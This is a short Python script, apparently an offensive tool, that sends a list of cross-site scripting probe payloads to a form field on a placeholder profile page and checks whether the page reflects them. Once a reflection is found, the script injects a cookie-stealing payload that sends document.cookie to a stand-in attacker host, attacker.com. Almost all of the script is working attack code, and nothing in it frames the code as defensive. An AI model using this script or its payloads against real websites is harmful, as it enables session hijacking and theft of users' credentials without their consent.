import requests
from bs4 import BeautifulSoup
import urllib.parse

# Target URL and payloads
TARGET_URL = 'http://vulnerable-website.com/profile'
PAYLOADS = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert('XSS')>",
    # Additional payloads for more advanced XSS testing
    "<svg onload=alert('XSS')>",
    "<input type='text' value='XSS' onfocus='alert(1)'>",
    "<a href='javascript:alert(1)'>Click me!</a>"
]

def submit_payload(url, payload):
    # Use requests to inject payload into the vulnerable input field
    response = requests.post(url, data={'name': payload})
    return response

def verify_xss(url):
    for payload in PAYLOADS:
        response = submit_payload(url, payload)
        # Parse the response content
        soup = BeautifulSoup(response.text, 'html.parser')
        # Check if payload is reflected back in the response
        if any(payload in str(tag) for tag in soup.find_all()):
            print(f"Potential XSS vulnerability found with payload: {payload}")
            return True
    return False

def perform_xss_attack(url):
    # Verify if XSS vulnerability exists
    if verify_xss(url):
        print("XSS vulnerability confirmed. Exploiting...")
        # Payload to exploit XSS
        exploit_payload = "<script>fetch('http://attacker.com/log?cookie=' + encodeURIComponent(document.cookie))</script>"
        response = submit_payload(url, exploit_payload)
        if response.status_code == 200:
            print("XSS exploit executed successfully.")
        else:
            print(f"Exploit failed with status code: {response.status_code}")
    else:
        print("No XSS vulnerability found.")

if __name__ == "__main__":
    perform_xss_attack(TARGET_URL)
